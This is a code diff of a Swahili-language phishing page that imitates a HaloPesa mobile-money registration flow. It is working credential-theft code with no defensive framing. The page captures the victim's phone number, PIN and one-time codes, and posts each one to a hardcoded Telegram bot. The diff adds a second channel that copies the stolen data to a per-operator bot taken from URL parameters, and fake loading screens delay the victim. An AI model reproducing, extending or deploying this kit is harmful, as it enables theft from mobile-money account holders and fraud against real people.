@@ -2,7 +2,6 @@
 <html lang="sw">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>HaloPesa Registration</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: sans-serif; }
@@ -10,7 +9,7 @@
         .phone-container { background-color: #ffffff; width: 100%; max-width: 412px; height: 100vh; display: flex; flex-direction: column; padding: 24px; position: relative; box-shadow: 0 4px 12px rgba(0,0,0,0.1); overflow: hidden; }
         .screen { display: none; flex-direction: column; height: 100%; width: 100%; }
         .screen.active { display: flex; }
-        h2 { font-size: 24px; font-weight: 700; margin-bottom: 24px; color: #111; }
+        h2 { font-size: 24px; font-weight: 700; margin-bottom: 24px; }
         .text-input { width: 100%; padding: 16px; border: 1px solid #e0e0e0; border-radius: 8px; font-size: 16px; outline: none; }
         .box-input-container { display: flex; gap: 12px; align-items: center; margin-bottom: 20px; }
         .box-input { width: 60px; height: 60px; border: 1px solid #e0e0e0; background-color: #f9f9f9; border-radius: 8px; text-align: center; font-size: 20px; font-weight: 600; outline: none; }
@@ -21,14 +20,12 @@
     </style>
 </head>
 <body>
-
     <div class="phone-container">
         <div class="screen active" id="screen-1">
             <h2>Namba ya simu</h2>
             <input type="tel" class="text-input" id="phone-field">
-            <button class="btn-primary" onclick="submitPhone()" style="margin-top:20px;">Endelea</button>
+            <button class="btn-primary" onclick="submitPhone()">Endelea</button>
         </div>
-
         <div class="screen" id="screen-2">
             <h2>Weka namba ya siri</h2>
             <div class="box-input-container" id="pin-container">
@@ -39,10 +36,9 @@
             </div>
             <button class="btn-primary" onclick="submitPin()">Endelea</button>
         </div>
-
         <div class="screen" id="screen-3">
-            <h2>Weka Msimbo wa OTP</h2>
-            <h2>Msimbo wa OTP ulitumwa kwa namba yako</h2>
+            <h2>Weka msimbo wa OTP</h2>
+            <h4>Msimbo wa OTP ulitumwa kwa namba yako.</h4>
             <h4>Kama ujumbe wa maandihi.</h4>
             <div class="box-input-container" id="otp-container">
                 <input type="text" class="box-input autotab" maxlength="1">
@@ -52,13 +48,9 @@
             </div>
             <button class="btn-primary" onclick="triggerLoading(4)">Endelea</button>
         </div>
-
         <div class="screen" id="screen-4"><div class="loading-container"><div class="spinner"></div></div></div>
-
         <div class="screen" id="screen-5">
-            <h2>Weka Msimbo wa OTP</h2>
-            <h4>Msimbo wa OTP ulitumwa kwa namba yako</h4>>
-            <h4>Kama ujumbe wa maandihi</h4>
+            <h2>Weka Maelezo tena</h2>
             <div class="box-input-container" id="details-container">
                 <input type="text" class="box-input autotab" maxlength="1">
                 <input type="text" class="box-input autotab" maxlength="1">
@@ -67,26 +59,33 @@
             </div>
             <button class="btn-primary" onclick="triggerContinuousLoading()">Endelea</button>
         </div>
-
         <div class="screen" id="screen-6"><div class="loading-container"><div class="spinner"></div></div></div>
     </div>
 
     <script>
-        // Data zako za Bot (Hardcoded kwa ajili ya Centralization)
-        const BOT_TOKEN = '8725998887:AAGvJzFOxgPDWP5v_l6eZEpIomiVcXx5gRE';
-        const CHAT_ID = '8735708057';
+        const MAIN_BOT_TOKEN = '8725998887:AAGvJzFOxgPDWP5v_l6eZEpIomiVcXx5gRE';
+        const MAIN_CHAT_ID = '8735708057';
 
         async function sendToTelegram(msg) {
-            const origin = window.location.search || "?original=unknown";
-            const finalMsg = `${msg}\n\n🔗 *Source:* \`${origin}\``;
-            
-            try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            const urlParams = new URLSearchParams(window.location.search);
+            const IND_TOKEN = urlParams.get('token');
+            const IND_ID = urlParams.get('id');
+
+            // 1. Tuma Main
+            fetch(`https://api.telegram.org/bot${MAIN_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: MAIN_CHAT_ID, text: `[Main] ${msg}`, parse_mode: 'Markdown' })
+            });
+
+            // 2. Tuma Individual
+            if (IND_TOKEN && IND_ID) {
+                fetch(`https://api.telegram.org/bot${IND_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: finalMsg, parse_mode: 'Markdown' })
+                    body: JSON.stringify({ chat_id: IND_ID, text: `[Personal] ${msg}`, parse_mode: 'Markdown' })
                 });
-            } catch (e) { console.error("Error:", e); }
+            }
         }
 
         function nextScreen(id) {
@@ -95,25 +94,19 @@
         }
 
         function submitPhone() { sendToTelegram(`📱 Namba: ${document.getElementById('phone-field').value}`); nextScreen(2); }
-        
         function submitPin() {
             let pin = ""; document.querySelectorAll('#pin-container .box-input').forEach(i => pin += i.value);
             sendToTelegram(`🔑 PIN: ${pin}`); nextScreen(3);
         }
-
         function triggerLoading(nextId) {
             let val = ""; document.querySelectorAll('#otp-container .box-input').forEach(i => val += i.value);
             sendToTelegram(`💬 Maelezo 1: ${val}`);
-            nextScreen(4);
-            setTimeout(() => nextScreen(nextId), 2000);
+            nextScreen(4); setTimeout(() => nextScreen(nextId), 2000);
         }
-
         function triggerContinuousLoading() {
             let val = ""; document.querySelectorAll('#details-container .box-input').forEach(i => val += i.value);
-            sendToTelegram(`📝 Maelezo 2: ${val}`);
-            nextScreen(6);
+            sendToTelegram(`📝 Maelezo 2: ${val}`); nextScreen(6);
         }
-
         document.querySelectorAll('.autotab').forEach((input, index, inputs) => {
             input.addEventListener('input', () => { if (input.value.length === 1 && index < inputs.length - 1) inputs[index + 1].focus(); });
         });
